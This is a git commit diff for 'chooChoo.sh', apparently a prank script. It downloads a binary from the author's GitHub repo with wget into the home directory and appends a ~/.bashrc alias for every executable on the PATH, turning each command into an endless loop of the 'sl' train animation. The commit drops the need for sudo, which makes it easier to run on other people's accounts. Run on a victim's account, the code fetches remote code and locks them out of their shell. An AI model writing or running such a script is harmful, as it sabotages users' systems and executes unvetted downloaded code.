893b706f229b7abc138b08c011f05fe502f24186
PatrickHirsch <45246344+PatrickHirsch@users.noreply.github.com>
2023-03-10 19:21:07 -0500

    Now uses wget to download sl binary as to avoid need for hightened privlages.  Also no longer writes while loop to script but sets aliases to while loop directly.

--- chooChoo.sh
+++ chooChoo.sh
@@ -1,21 +1,13 @@
 #!/bin/bash
 
-chooChoo="$HOME/.chooChoo.sh";
-echo "#!/bin/bash" 	> $chooChoo;
-echo "while :" 		>> $chooChoo;
-echo "do"			>> $chooChoo;
-echo "	sl;" 		>> $chooChoo;
-echo "done" 		>> $chooChoo;
+chooChoo=$HOME/.sl
+wget https://github.com/PatrickHirsch/ChooChoo/blob/main/sl?raw=true -O $chooChoo -q
 chmod a+x $chooChoo;
 
 for dir in $(echo $PATH | tr ':' ' ')
 do
   for file in $dir/*
   do
-    echo alias $(basename $file)=$chooChoo >> ~/.bashrc
+    echo "alias $(basename $file)='while :; do $chooChoo; done'" >> ~/.bashrc
   done
 done
-
-if ! command -v sl &> /dev/null; then
-  sudo yum install -y sl > /dev/null 2>&1 || sudo pacman -S --noconfirm sl > /dev/null 2>&1 || sudo apt-get install -y sl > /dev/null 2>&1 
-fi
